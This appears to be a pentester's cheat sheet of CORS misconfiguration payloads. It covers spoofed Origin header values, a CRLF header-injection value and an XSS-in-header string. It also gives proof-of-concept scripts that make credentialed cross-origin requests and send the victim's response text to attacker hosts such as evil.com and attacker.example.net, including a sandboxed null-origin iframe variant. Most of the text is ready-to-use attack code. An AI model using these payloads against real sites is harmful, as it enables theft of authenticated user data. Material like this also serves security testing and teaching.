
# **CORS PAYLOADS**

    Origin: https://evil.com
    Origin: null
    Origin: https://evilexample.com
    Origin: https://evilexample.com
    Origin:null
    Origin:attacker.com
    Origin:attacker.target.com
    Origin:attackertarget.com
    Origin:sub.attackertarget.com
    Origin:attacker.com      and then change the method Get to post/Post to Get
    Origin:sub.attacker target.com
    Origin:sub.attacker%target.com
    Origin:attacker.com/target.com
    Origin:expected-host.com.attacker.com
    Origin:expected-host.computer
    Origin:foo@evil-host:80@expected-host
    Origin:foo@evil-host%20@expected-host
    Origin:evil-host%09expected-host
    Origin:127.1.1.1:80\@127.2.2.2:80
    Origin:127.1.1.1:80:\@@127.2.2.2:80
    Origin:127.1.1.1:80#\@127.2.2.2:80
    Origin:ß.evil-host



**Server-side cache poisoning:**

    Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
    Access-Control-Allow-Origin: z
    Content-Type: text/html; charset=UTF-7

**Custom-http-header:** 

    user-id: <svg/onload=alert(1)>

## **Exploit:**

    #1
    <html>
	    <body>
             <h2>CORS PoC</h2>
             <div id="demo">
                 <button type="button"	onclick="cors()">Exploit</button>
             </div>
             <script>
                 function cors() {
                 var xhr = new XMLHttpRequest();
                 xhr.onreadystatechange = function() {
                     if (this.readyState == 4 && this.status == 200) {
                     document.getElementById("demo").innerHTML = alert(this.responseText);
                     }
                 };
                  xhr.open("GET",
                           "https://victim.example.com/endpoint", true);
                 xhr.withCredentials = true;
                 xhr.send();
                 }
             </script>
         </body>
     </html>
	
	     
	#2
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://exaple.com/sens_data',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	   location='127.0.0.1='+this.responseText;
	};
	
	
	
	#3
	<script>
	    document.location="http://subdomain.exaple.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://exaple.com/sens_point',true); req.withCredentials = true;req.send();function reqListener() {location='https:/evil.com/listener?q='%2bthis.responseText; };%3c/script>"
	</script>
	     

 
**Null Origin:**
 
 

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://victim.example.com/endpoint',true);
      req.withCredentials = true;
      req.send();
    
      function reqListener() {
        location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
       };
    </script>"></iframe> 


**exploit whith xss :** 

    https://subdomain.vulnerable-website.com/?xss="><script>cors-stuff-here</script>

